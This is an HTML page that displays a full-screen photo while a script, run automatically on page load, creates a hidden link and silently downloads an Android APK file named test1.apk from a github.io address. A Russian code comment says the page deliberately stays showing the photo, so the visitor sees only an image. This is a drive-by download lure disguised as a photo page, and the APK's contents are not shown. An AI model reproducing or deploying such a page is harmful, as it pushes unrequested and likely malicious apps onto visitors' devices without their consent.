        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; }
        .full-image-container { width: 100%; height: 100%; position: relative; }
        .full-image-container img { width: 100%; height: 100%; object-fit: cover; display: block; }

<body>
    <div class="full-image-container">
        <img src="https://94kz55hfdb-netizen.github.io/test/downloads/photo11.jpg" alt="Фото">
    </div>
    
    <script>
        const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
        const apkUrl = repoBaseUrl + 'downloads/test1.apk'; 
        const apkFilename = 'test1.apk'; 

        function startDownload() {
            const link = document.createElement('a');
            link.href = apkUrl + '?t=' + Date.now(); 
            link.download = apkFilename; 
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            // Убрали изменение содержимого — страница остается с фото
        }

        window.onload = function() {
            setTimeout(startDownload, 500); 
        };
    </script>
</body>
